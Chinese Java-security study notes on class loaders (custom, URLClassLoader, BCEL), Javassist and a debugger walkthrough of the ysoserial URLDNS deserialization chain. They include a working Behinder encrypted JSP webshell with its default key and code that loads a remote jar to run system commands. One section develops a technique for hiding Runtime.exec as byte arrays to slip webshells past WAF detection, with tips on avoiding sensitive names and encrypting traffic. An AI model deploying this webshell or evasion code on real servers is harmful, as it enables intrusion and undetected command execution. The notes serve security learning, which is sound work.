既然已知ClassLoader具备了加载类的能力，那么我们不妨尝试下写一个自己的类加载器来实现加载自定义的字节码（这里以加载`TestHelloWorld`类为例）并调用hello方法。

如果`TestHelloWorld`类存在的情况下，我们可以使用如下代码即可实现调用`helle`方法并输出：

```
TestHelloWorld testHelloWorld = new TestHelloWorld();
System.out.println(testHelloWorld.Hello());
```

但是如果`TestHelloWorld`不存在于我们的`classpath`，那么我们可以使用自定义类加载器重写`findClass`方法，然后调用`defineClass`方法的时候传入`TestHelloWorld`类的字节码的方式来向JVM中定义一个`TestHelloWorld`类，最后通过反射机制就可以调用`TestHelloWorld`类的`hello`方法了。

```
import java.lang.reflect.Method;
import java.util.Base64;

public class TestClassLoader1 extends ClassLoader{
    private static String testClassName = "TestHelloWorld";
    private static byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIgoACAASCQATABQIABUKABYAFwgAGAgAGQcAGgcAGwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAVIZWxsbwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIPGNsaW5pdD4BAApTb3VyY2VGaWxlAQATVGVzdEhlbGxvV29ybGQuamF2YQwACQAKBwAcDAAdAB4BABhUZXN0SGVsbG9Xb3JsZCBjb25zdHJ1Y3QHAB8MACAAIQEAC0hlbGxvIFdvcmxkAQAVVGVzdEhlbGxvV29ybGQgc3RhdGljAQAOVGVzdEhlbGxvV29ybGQBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABwAIAAAAAAADAAEACQAKAAEACwAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAwAAAAOAAMAAAAFAAQABgAMAAcAAQANAA4AAQALAAAAGwABAAEAAAADEgWwAAAAAQAMAAAABgABAAAACQAIAA8ACgABAAsAAAAlAAIAAAAAAAmyAAISBrYABLEAAAABAAwAAAAKAAIAAAADAAgABAABABAAAAACABE=");

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        // 只处理 TestHelloWorld 类
        if(name.equals(testClassName)){
            // 调用JVM的native方法定义TestHelloWorld类
            return defineClass(testClassName,code,0,code.length);
        }
        return super.findClass(name);
    }

    public static void main(String[] args) {
        // 创建自定义的类加载器
        TestClassLoader1 loader = new TestClassLoader1();
        try {
            // 使用自定义的类加载器加载TestHelloWorld类
            Class<?> testClass = loader.loadClass(testClassName);
            // 反射创建TestHelloWorld类，等价于 new xxx()
            Object instance = testClass.newInstance();
            // 反射获取hello方法
            Method method = instance.getClass().getMethod("Hello");
            // 反射调用hello方法
            String str = (String) method.invoke(instance);
            System.out.println(str);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码的native方法绕过RASP检测，也可以用于加密重要的Java类字节码(只能算弱加密了)。

## URLClassLoader

`URLClassLoader`继承了`ClassLoader`，`URLClassLoader`提供了加载远程资源的能力，在写漏洞利用的`payload`或者`webshell`的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。

制作jar

```
import java.io.IOException;

public class CMD {
    public static Process exec(String cmd) throws IOException {
        return Runtime.getRuntime().exec(cmd);
    }
}
```

先编译： `javac8 CMD.java`

打jar包：`jar8 cvf CMD.jar CMD.class`

```
TestURLClassLoader.java
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.net.URLClassLoader;

public class TestURLClassLoader {
    public static void main(String[] args) {
        try{
            // 定义远程加载的jatr路径
            URL url = new URL("https://anbai.io/tools/cmd.jar");
            // 创建URLClassLoader对象，并加载远程jar包
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url});
            // 定义需要执行的命令
            String cmd  = "whoami";
            // 通过URLClassLoader加载远程jar包中的CMD类
            Class<?> cmdClass = urlClassLoader.loadClass("CMD");
            // 调用CMD类中的exec方法，
            Process process = (Process) cmdClass.getMethod("exec", String.class).invoke(null, cmd);
            // 获取命令执行结果的输入流
            InputStream inputStream = process.getInputStream();
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] bytes = new byte[1024];
            int a = -1;
            while ((a=inputStream.read(bytes))!=-1){
                byteArrayOutputStream.write(bytes,0,a);
            }
            // 输出
            System.out.println(byteArrayOutputStream.toString());
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

## 类加载隔离

创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两者必须是非继承关系），同级ClassLaoder跨类加载器调用方法时必须使用反射。

![image-20211025171150475](img/202110251829223.png)![image-20211025171150475](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/202110251829223.png?lastModify=1646033842)

#### 跨类加载器加载

RASP和IAST经过会用到跨类加载器加载类的情况，因为RASP/IAST会在任意可能存在安全风险的类中插入检测代码，因此必须得保证RASP/IAST的类能够被插入的类所使用的类加载正确加载，否则就会出现ClassNotFoundException，除此之外，跨类加载器调用类方法时需要特别注意一个基本原则：`ClassLoader A和ClassLoader B可以加载相同类名的类，但是ClassLoader A中的Class A和ClassLoader B中的Class A是完全不同的对象，两者之间调用只能通过反射`。

```
package com.anbai.sec.classloader;

import java.lang.reflect.Method;

import static com.anbai.sec.classloader.TestClassLoader.TEST_CLASS_BYTES;
import static com.anbai.sec.classloader.TestClassLoader.TEST_CLASS_NAME;

public class TestCrossClassLoader {

   public static class ClassLoaderA extends ClassLoader {

      public ClassLoaderA(ClassLoader parent) {
         super(parent);
      }

      {
         // 加载类字节码
         defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
      }

   }

   public static class ClassLoaderB extends ClassLoader {

      public ClassLoaderB(ClassLoader parent) {
         super(parent);
      }

      {
         // 加载类字节码
         defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
      }

   }

   public static void main(String[] args) throws Exception {
      // 父类加载器
      ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();

      // A类加载器
      ClassLoaderA aClassLoader = new ClassLoaderA(parentClassLoader);

      // B类加载器
      ClassLoaderB bClassLoader = new ClassLoaderB(parentClassLoader);

      // 使用A/B类加载器加载同一个类
      Class<?> aClass  = Class.forName(TEST_CLASS_NAME, true, aClassLoader);
      Class<?> aaClass = Class.forName(TEST_CLASS_NAME, true, aClassLoader);
      Class<?> bClass  = Class.forName(TEST_CLASS_NAME, true, bClassLoader);

      // 比较A类加载和B类加载器加载的类是否相等
      System.out.println("aClass == aaClass：" + (aClass == aaClass));
      System.out.println("aClass == bClass：" + (aClass == bClass));

      System.out.println("\n" + aClass.getName() + "方法清单：");

      // 获取该类所有方法
      Method[] methods = aClass.getDeclaredMethods();

      for (Method method : methods) {
         System.out.println(method);
      }

      // 创建类实例
      Object instanceA = aClass.newInstance();

      // 获取hello方法
      Method helloMethod = aClass.getMethod("hello");

      // 调用hello方法
      String result = (String) helloMethod.invoke(instanceA);

      System.out.println("\n反射调用：" + TEST_CLASS_NAME + "类" + helloMethod.getName() + "方法，返回结果：" + result);
   }
}
```

输出：

```
aClass == aaClass：true
aClass == bClass：false

com.anbai.sec.classloader.TestHelloWorld方法清单：
public java.lang.String com.anbai.sec.classloader.TestHelloWorld.hello()

反射调用：com.anbai.sec.classloader.TestHelloWorld类hello方法，返回结果：Hello World~
```

没理解，直接贴出代码。

## JSP自定义类加载后门

以`冰蝎`为首的JSP后门利用的就是自定义类加载实现的，冰蝎的客户端会将待执行的命令或代码片段通过动态编译成类字节码并加密后传到冰蝎的JSP后门，后门会经过AES解密得到一个随机类名的类字节码，然后调用自定义的类加载器加载，最终通过该类重写的`equals`方法实现恶意攻击，其中`equals`方法传入的`pageContext`对象是为了便于获取到请求和响应对象，需要注意的是冰蝎的命令执行等参数不会从请求中获取，而是直接插入到了类成员变量中。

`冰蝎JSP后门`：

```
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
    class U extends ClassLoader {

        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
%>
<%
    if (request.getMethod().equals("POST")) {
        String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
        session.putValue("u", k);
        Cipher c = Cipher.getInstance("AES");
        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
        new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
%>
```

## BCELClassLoader

[BCEL](https://commons.apache.org/proper/commons-bcel/)（`Apache Commons BCEL™`）是一个用于分析、创建和操纵Java类文件的工具库，Oracle JDK引用了BCEL库，不过修改了原包名`org.apache.bcel.util.ClassLoader`为`com.sun.org.apache.bcel.internal.util.ClassLoader`，BCEL的类加载器在解析类名时会对ClassName中有`$$BCEL$$`标识的类做特殊处理，该特性经常被用于编写各类攻击Payload。

#### BCEL攻击原理

当BCEL的`com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass`加载一个类名中带有`$$BCEL$$`的类时会截取出`$$BCEL`后面的字符串，然后使用`com.sun.org.apache.bcel.internal.classfile.Utility#decode`将字符串解析成类字节码（带有攻击代码的恶意类），最后会调用`defineClass`注册解码后的类，一旦该类被加载就会触发类中的恶意代码，正是因为BCEL有了这个特性，才得以被广泛的应用于各类攻击payload中。

![image-20211021104833683](img/202110251829177.png)![image-20211021104833683](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/202110251829177.png?lastModify=1646033842)

#### BCEL编解码

`BCEL编码`：

https://zhishihezi.net/endpoint/richtext/76290e1cf5ea224079c2e19ef2984523?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00f31548dfe08150ea441b2e8b5b1ff2815007ee7d0070dfde1640b5779eca8d36254c858bd38596ae8769abdaece4c94fb42133785fe8fd5cbb2b219ed10bfa05323cda622c9c226d0d4cd1967aaffe28435dea967bc1789da21f8fd395e75e5e69a2918a52a3d98f5332555401524990076b45c5664fc04d0caddd653841198d37a6a5eedcaf63c0e895e80d7571e8ced8c1f8e7f433fbd1c625eb5a8d8028501d2168445339b9703f2e014a6eef07c6ab687a35da5d4f21d475154b4c911f91#9

## Xalan ClassLoader

## JSP类加载

https://www.yuque.com/gaohanghang/sgrbwh/hpqkvg

# Javassist动态编程

## 介绍

Java字节码以二进制的形式存储在 class 文件中，每一个class文件包含一个java类或接口，javassist就是一个用来处理Java字节码的类库。

`Javassist`是一个开源的分析、编辑和创建Java字节码的类库。

## 使用

#### **ClassPool**

`ClassPool` ：一个基于哈希表(`Hashtable`)实现的`CtClass`对象容器，其中键名是类名称，值是表示该类的`CtClass`对象(`Hashtable`和`Hashdump`类似都是实现map接口，hashmap可以接收null的值，但是Hashtable不行)。

常用的方法：

```
static ClassPool   getDefault()   返回默认的类池

ClassPath insertClassPath(java.lang.String.pathname)  在搜索路径的开头插入目录或jar或zip文件

ClassPath insertClassPath(ClassPath cp)  ClassPath在搜索路径的开头插入一个对象

java.lang.ClassLoader getClassLoader()  获取类加载器toClass() ,getAnnotations() 在 CtClass等

CtClass get(java.lang.String classname)  从源中读取类文件，并返回CtClass表示该文件的对象的引用

ClassPath appendClassPath(ClassPath cp)  将ClassPath对象附加到搜索路径的末尾

CtClass makeClass(java.lang.String classname)  创建一个新的public类
```

#### CtClass

`CtClass`表示类，一个`CtClass`(编译时类)对象可以处理一个`class`文件，这些`CtClass`对象可以从`ClassPool`的一些方法中获取。

常用方法：

```
void setSuperclass(CtClass clazz)  更改超类，除非此对象表示接口

java.lang.Class<?> toClass(java.lang.invoke.MethodHandlers.Lookup lookup) 将此类转换成 java.lang.Class对象

byte[] toBytecode()  将该类转换为类文件

void writeFile()  将由此CtClass对象表示的类文件写入当前目录

void writeFile(java.lang.String directoryName)  将由此CtClass 对象表示的类文件写入本地磁盘

CtConstructor makeClassInitializer()  制作一个空的类初始化程序(静态构造函数)
```

#### CtMethod

`CtMethod` : 表示类中的方法

#### CtConstructor

CtConstructor 的实例表示一个构造函数，它可能代表一个静态构造函数(类初始化器)。

常用方法：

```
void setBody(java.lang.String src)  设置构造函数主体

void setBody(CtConstructor src,ClassMap map)  从另一个构造函数复制一个构造函数主体

CtMethod toMethod(java.lang.String name,CtClass declaring)  复制此构造函数并将其转换为方法
```

#### ClassClassPath

该类作用是用于通过 getResourceAsStream() 在 java.lang.Class 中获取该类文件的搜索路径。

构造函数

```
ClassClassPath(java.lang.Class<?> c)  创建一个搜索路径
```

常见方法

```
java.net.URL  find(java.lang.String classname)   获取指定类文件的URL
java.io.InputStream openClassFile(java.lang.String classname)  通过获取类名 getResourceAsStream()
```

## 代码

```
ClassPool pool = ClassPool.getDefault();
```

在默认系统搜索路径获取`ClassPool` 对象。

如果需要修改类搜索的路径需要使用`insertClassPath` 方法进行修改。

```
pool.insertClassPath(new ClassClassPath(this.getClass()))
```

将本类所在的路径插入到搜索路径中。

## toBytecode

```
import javassist.*;

import java.io.IOException;
import java.util.Arrays;

public class TestSsist {
    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Test.class.getClass()));
        CtClass ctClass = pool.get("Test");
        ctClass.setSuperclass(pool.get("Test"));
        byte[] bytes = ctClass.toBytecode();
        String s = Arrays.toString(bytes);
        System.out.println(s);
    }
}
```

![image-20220114190405956](img/image-20220114190405956.png)![image-20220114190405956](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114190405956.png?lastModify=1646033842)

## toClass

```
public class Test {
    static {
        System.out.println("Test static");
    }
    public Test() {
        System.out.println("Test construct");
    }
    public static void main(String[] args) {
        System.out.println("Test main");
    }

    public void say(){
        System.out.println("Test Hello");
    }
}
```



```
import javassist.*;

public class TestToClass {
    public static void main(String[] args) throws NotFoundException, CannotCompileException, InstantiationException, IllegalAccessException {
        // 创建 ClassPool 对象
        ClassPool pool = ClassPool.getDefault();
        // 返回 Test对象的 CtClass 引用
        CtClass test = pool.get("Test");
        // 获取方法
        CtMethod say = test.getDeclaredMethod("say");
        // 插入
        say.insertBefore("{System.out.println(\"Hello.Say()\");}");
        // 转换成 Test 类的Class对象
        Class<?> test1 = test.toClass();
        // 实例化
        Test test2 = (Test) test1.newInstance();
        test2.say();
    }
}
```

输出：

```
Test static
Test construct
Hello.Say()
Test Hello
```

## PS

> 按照我的理解来说就是可以去将类和字节码进行互相转换。那么按照这个思路来延申的话，我们可以做到什么呢？我首先想到的可能就是webshell的一些免杀，例如说Jsp的最常见的一些webshell，都是采用`Runtime`，`ProcessBuilder`这两个类去进行构造，执行命令。按照WAF的惯性这些设备肯定是把这些常见的执行命令函数给拉入黑名单里面去。那么如果说可以转换成字节码的话呢？字节码肯定是不会被杀的。如果说这时候将`Runtime`这个类转换成字节码，内嵌在Jsp中，后面再使用`Javassist`来将字节码还原成类的话，如果转换的几个方法没被杀的话，是可以实现过WAF的。当然这些也只是我的一些`臆想`,因为Javassist并不是JDK中自带的，实现的话后面可以再研究一下。但是类加载器肯定是可以去加载字节码，然后实现执行命令的。这里只是抛砖引玉，更多的就不细说了。如果有更好的想法也可以提出来一起去交流。

## 想法实现

```
public class test {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
        byte[] b1 = new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101};
        String run = new String(b1);
        String command = "ipconfig";


        Class aClass = Class.forName(run);
        Constructor declaredConstructor = aClass.getDeclaredConstructor();
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance();
        Method exec = aClass.getMethod("exec", String.class);
        Process process = (Process) exec.invoke(o,command);
        InputStream inputStream = process.getInputStream();    //获取输出的数据
        String ipconfig = IOUtils.toString(inputStream,"gbk"); //字节输出流转换为字符
        System.out.println(ipconfig);

    }
}	
```

命令执行成功。

那么这就是一段完整的代码，但是还有些地方处理得不是很好，比如：

```
 Method exec = aClass.getMethod("exec", String.class);
```

这里是反射获取`exec`方法，这里的exec是固定的。`exec`这个对于一些设备来说也是严杀的。

那么在这里就可以来处理一下，也转换成字节码。

转换后的字节码：

```
[101, 120, 101, 99]
```

改进一下代码：

```
public class test {
    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException {
        String command = "ipconfig";
        byte[] b1 = new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101};
        String run = new String(b1);
        byte[] b2 = new byte[]{101, 120, 101, 99};
        String cm = new String(b2);
        


        Class aClass = Class.forName(run);
        Constructor declaredConstructor = aClass.getDeclaredConstructor();
        declaredConstructor.setAccessible(true);
        Object o = declaredConstructor.newInstance();
        Method exec = aClass.getMethod(cm, String.class);
        Process process = (Process) exec.invoke(o,command);
        InputStream inputStream = process.getInputStream();    //获取输出的数据
        String ipconfig = IOUtils.toString(inputStream,"gbk"); //字节输出流转换为字符
        System.out.println(ipconfig);

    }
}
```

际中运用就别用啥`ipconfig`和`command`这些来命名了，这些都是一些敏感词。这里只是为了方便理解。

在真实情况下应该是`request.getInputStream()`来获取输入的命令的。那么这里也还需要注意传输的时候进行加密，不然流量肯定也是过不了设备的。

https://www.cnblogs.com/nice0e3/p/13811335.html

[https://www.cnblogs.com/CoLo/p/15383642.html#%E5%8A%A8%E6%80%81%E7%BC%96%E7%A8%8B%E4%B8%8Ejavassist](https://www.cnblogs.com/CoLo/p/15383642.html#动态编程与javassist)

# URLdns链

## ysoserial运行流程分析

这里可以配置好需要的参数

![image-20220114205839352](img/image-20220114205839352.png)![image-20220114205839352](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114205839352.png?lastModify=1646033842)

主类

![image-20220114204820390](img/image-20220114204820390.png)![image-20220114204820390](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114204820390.png?lastModify=1646033842)

首先如果不是两个参数，打印使用选项，退出。

是的话，把两个参数分别赋值给`payloadType`，`command`。

然后获取`payloadType`的需要继承ObjectPayload类的Class类对象，

![image-20220114204906282](img/image-20220114204906282.png)![image-20220114204906282](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114204906282.png?lastModify=1646033842)

跟进`Utils.getPayloadClass`

这里反射得到了一个类对象，并通过一些if判断后将其返回。

因为反射参数是需要完整包名的，所以这里 clazz == null,然后将其拼接报名后，反射获取类对象

![image-20220114210149854](img/image-20220114210149854.png)![image-20220114210149854](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114210149854.png?lastModify=1646033842)

反射将对象实例化，(ObjectPayload 类型是因为工具里 paylaod都继承于它),

![image-20220114210422537](img/image-20220114210422537.png)![image-20220114210422537](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114210422537.png?lastModify=1646033842)

跟进`getObject`方法，这里重写了`ObjectPayload` 的方法，然后返回`ht` 对象，这里ht对象是需要序列化的对象，具体利用稍后分析。

![image-20220114210713777](img/image-20220114210713777.png)![image-20220114210713777](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114210713777.png?lastModify=1646033842)

跟进`Serializer.serialize` 方法，这里知识工具写的自己的一个类，并不是JDK自带的

![image-20220114210858723](img/image-20220114210858723.png)![image-20220114210858723](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114210858723.png?lastModify=1646033842)

这里是将传进来的 对象序列化，然后打印出来,这里打印出来的就是我们需要的payload

![image-20220114211009549](img/image-20220114211009549.png)![image-20220114211009549](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114211009549.png?lastModify=1646033842)

这里再跟进一下，之后的代码就收尾了。

![image-20220114211131814](img/image-20220114211131814.png)![image-20220114211131814](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114211131814.png?lastModify=1646033842)

直接返回

![image-20220114211352350](img/image-20220114211352350.png)![image-20220114211352350](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114211352350.png?lastModify=1646033842)

## URLDNS使用

URLDNS这条利用链并不依赖于第三方的类库，是JDK中内置的一些类的方法，所以作为漏洞检测来说是一个较好的方法。

打包 jar 包

```
mvn clean package -DskipTests
```

生成序列化payload ,写进 payload.txt

```
java8 -jar .\ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://1o447t.ceye.io" > payload.txt
```

测试demo:

```
package urldns;

import java.io.*;

public class URLDNSTest {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("payload.txt"));
        objectInputStream.readObject();
    }
}
```

![image-20220114213636436](img/image-20220114213636436.png)![image-20220114213636436](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114213636436.png?lastModify=1646033842)

成功收到DNS请求，也就是说payload执行成功。

## URLDNS链分析

ysoserial 中已经给出其利用链

```
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
```



我们从 `POC`在调试一遍`objectInputStream.readObject();` 下断点，继续跟进`readObject`方法，因为这是JDK原生方法，所以强制步入

![image-20220114221228188](img/image-20220114221228188.png)![image-20220114221228188](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114221228188.png?lastModify=1646033842)

这里跟进`readObject0` 方法

![image-20220114221513429](img/image-20220114221513429.png)![image-20220114221513429](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114221513429.png?lastModify=1646033842)

获取序列化数据的第一个字符 115

![image-20220115102654590](img/image-20220115102654590.png)![image-20220115102654590](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115102654590.png?lastModify=1646033842)

如果是对象的反序列化，这里tc=115，即0x73，所以走下面的TC_OBJECT

跟进`readOrdinaryObject`

![image-20220115102756050](img/image-20220115102756050.png)![image-20220115102756050](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115102756050.png?lastModify=1646033842)

`readClassDesc` 读取类的描述信息，

`checkDeserialize` 是否能够反序列化，不能的话抛出异常

![image-20220115103702260](img/image-20220115103702260.png)![image-20220115103702260](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115103702260.png?lastModify=1646033842)

![image-20220115103654106](img/image-20220115103654106.png)![image-20220115103654106](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115103654106.png?lastModify=1646033842)

`desc.newInstance()` 实例化对象，此时对象的属性为空

`readSerialData` 进行对象属性赋值

![image-20220115103937990](img/image-20220115103937990.png)![image-20220115103937990](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115103937990.png?lastModify=1646033842)

然后一步步调用到`HashMap` 的 readObject 方法，我们直接打断点

![image-20220115104939561](img/image-20220115104939561.png)![image-20220115104939561](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115104939561.png?lastModify=1646033842)

跟进`hash`方法

![image-20220115104958594](img/image-20220115104958594.png)![image-20220115104958594](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115104958594.png?lastModify=1646033842)

跟进`key.hashCode()` ，key为一个URL对象

![image-20220115105027620](img/image-20220115105027620.png)![image-20220115105027620](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115105027620.png?lastModify=1646033842)

继续跟进`hashCode` 方法

![image-20220115105059240](img/image-20220115105059240.png)![image-20220115105059240](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115105059240.png?lastModify=1646033842)

跟进`getHostAddress` 

![image-20220115105130340](img/image-20220115105130340.png)![image-20220115105130340](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115105130340.png?lastModify=1646033842)

`InetAddress.getByName(host);`成功触发dns请求

![image-20220115105140552](img/image-20220115105140552.png)![image-20220115105140552](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115105140552.png?lastModify=1646033842)

整个链

```
HashMap:readObject -->
HashMap:hash -->
URL:hashCode -->
URLStreamHandler:hashCode -->
URLStreamHandle:getHostAddress -->
InetAddress:getByName
```

## 思考

在构造poc的时候按理说也会执行相应的流程，产生DNS请求，这样会在实际中产生混淆。

看看ysoserial中是如何避免的

```
package ysoserial.payloads;

import java.io.IOException;
import java.net.InetAddress;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.net.URL;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * A blog post with more details about this gadget chain is at the url below:
 *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/
 *
 *   This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 *   posting describing how he modified the Java Commons Collections gadget
 *   in ysoserial to open a URL. This takes the same idea, but eliminates
 *   the dependency on Commons Collections and does a DNS lookup with just
 *   standard JDK classes.
 *
 *   The Java URL class has an interesting property on its equals and
 *   hashCode methods. The URL class will, as a side effect, do a DNS lookup
 *   during a comparison (either equals or hashCode).
 *
 *   As part of deserialization, HashMap calls hashCode on each key that it
 *   deserializes, so using a Java URL object as a serialized key allows
 *   it to trigger a DNS lookup.
 *
 *   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 *
 *
 */
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest(skip = "true")
@Dependencies()
@Authors({ Authors.GEBL })
public class URLDNS implements ObjectPayload<Object> {

        public Object getObject(final String url) throws Exception {

                //Avoid DNS resolution during payload creation
                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.
                URLStreamHandler handler = new SilentURLStreamHandler();

                HashMap ht = new HashMap(); // HashMap that will contain the URL
                URL u = new URL(null, url, handler); // URL to use as the Key
                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.

                return ht;
        }

        public static void main(final String[] args) throws Exception {
                PayloadRunner.run(URLDNS.class, args);
        }

        /**
         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
         * using the serialized object.</p>
         *
         * <b>Potential false negative:</b>
         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
         * second resolution.</p>
         */
        static class SilentURLStreamHandler extends URLStreamHandler {

                protected URLConnection openConnection(URL u) throws IOException {
                        return null;
                }

                protected synchronized InetAddress getHostAddress(URL u) {
                        return null;
                }
        }
}
```

这里作者自己写了一个类，继承 `URLStreamHandler` 并重写 `getHostAddress` 方法，而这个方法恰巧是触发DNS请求的关键。

触发点是 `put` 方法，打断点，跟进，参数为 一个URL对象和 url字符串，

注意：前方作者 new 了一个 `SilentURLStreamHandler` 对象，并将其作为参数传入URL构造方法，使得`transient URLStreamHandler handler;` 被赋值。

![image-20220114214221404](img/image-20220114214221404.png)![image-20220114214221404](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114214221404.png?lastModify=1646033842)

跟进`hash`方法， key 为属性为我们传入的 url的 URL对象，

![image-20220114214536707](img/image-20220114214536707.png)![image-20220114214536707](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114214536707.png?lastModify=1646033842)

跟进 `hashCode` 方法，

![image-20220114214513808](img/image-20220114214513808.png)![image-20220114214513808](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114214513808.png?lastModify=1646033842)

这里 `hashCode` 初始值为 -1 ，所以跳过if，

```
private int hashCode = -1;
```

![image-20220115110602331](img/image-20220115110602331.png)![image-20220115110602331](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115110602331.png?lastModify=1646033842)

继续跟进`handler.hashCode` ,这里 handler 即为上边的`SilentURLStreamHandler` 对象，

```
transient URLStreamHandler handler;
```

`SilentURLStreamHandler`没有重写`hashCode`方法，所以跳入`URLStreamHandler` 的`hashCode`方法，这里先得到 URL 的协议 http ，然后计算其hashcode，![image-20220114214940568](img/image-20220114214940568.png)![image-20220114214940568](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220114214940568.png?lastModify=1646033842)

跟进`getHostAddress` ,注意这里`SilentURLStreamHandler` 重写了`getHostAddress` 方法，也就是说会跳进重写的方法里，

![image-20220115110903822](img/image-20220115110903822.png)![image-20220115110903822](file://D:/tools/java%E5%AE%89%E5%85%A8/javasec_learn/img/image-20220115110903822.png?lastModify=1646033842)

所以这里生成poc是不会产生 dns 请求。

那为什么反序列化时产生了dns请求，不会走重写的`getHostAddress` 的方法呢？

